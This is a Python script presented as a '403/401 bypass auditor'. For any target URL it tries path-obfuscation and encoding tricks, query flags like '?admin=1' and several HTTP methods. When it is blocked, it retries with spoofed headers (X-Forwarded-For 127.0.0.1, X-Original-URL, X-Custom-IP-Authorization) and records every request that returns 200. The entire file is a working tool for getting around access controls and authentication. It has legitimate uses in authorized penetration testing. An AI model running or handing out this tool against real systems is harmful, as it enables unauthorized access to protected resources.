import requests
import argparse
import sys
from urllib.parse import urlparse, quote

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

SUCCESS_LOG = []

def get_args():
    parser = argparse.ArgumentParser(description="Ultimate 403/401 Bypass Auditor")
    parser.add_argument("-u", "--url", required=True, help="Full target URL")
    return parser.parse_args()

def generate_variations(path):
    if not path.startswith('/'): path = '/' + path
    v = set([path])
    
    # 1. Path Obfuscation
    v.add(path + "/")
    v.add(path + "/.")
    v.add(path + "..;/")
    v.add(path.upper())
    v.add(path.replace("/", "//"))
    v.add("/." + path)
    
    # 2. Query Parameter Fuzzing (New Research)
    queries = ["?method=json", "?format=json", "?_method=GET", "?debug=true", "?admin=1"]
    for q in queries:
        v.add(path + q)

    # 3. Unicode & Encoding
    v.add(path.replace("a", "%61")) # Simple encoding
    v.add(path.replace("/", "%252f")) # Double encoding slash
    v.add(path.replace(".", "%u002e")) # Unicode dot
    
    return list(v)

def audit(target_url):
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path if parsed.path else "/"
    
    methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
    
    # Advanced Security Headers
    headers_list = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Original-URL": path},
        {"X-Rewrite-URL": path},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Original-Method": "GET"},
        {"X-Forwarded-Proto": "http"},
        {"Content-Type": "application/json"} # Testing if format change bypasses WAF
    ]

    print(f"[*] Auditing: {base_url}{path}\n")
    print(f"{'METHOD':<8} | {'STATUS':<6} | {'SIZE':<8} | {'PAYLOAD'}")
    print("-" * 75)

    variations = generate_variations(path)
    session = requests.Session()
    session.verify = False

    for method in methods:
        for p_payload in variations:
            url = base_url + p_payload
            try:
                # Baseline
                res = session.request(method, url, timeout=5, allow_redirects=False)
                print(f"{method:<8} | {res.status_code:<6} | {len(res.content):<8} | {p_payload}")
                
                if res.status_code == 200:
                    SUCCESS_LOG.append(f"Method: {method} | Path: {p_payload}")

                # If blocked, try Header Injections
                if res.status_code in [401, 403]:
                    for h in headers_list:
                        h_res = session.request(method, url, headers=h, timeout=5, allow_redirects=False)
                        if h_res.status_code == 200:
                            print(f"  [!] SUCCESS WITH HEADER: {h}")
                            SUCCESS_LOG.append(f"Method: {method} | Path: {p_payload} | Header: {h}")
            except:
                continue

def print_summary():
    print("\n" + "="*50)
    print("             SUCCESSFUL BYPASSES")
    print("="*50)
    if not SUCCESS_LOG:
        print("No successful 200 OK bypasses found.")
    else:
        for entry in set(SUCCESS_LOG): # Set to remove duplicates
            print(f"[+] {entry}")
    print("="*50)

if __name__ == "__main__":
    args = get_args()
    audit(args.url)
    print_summary()
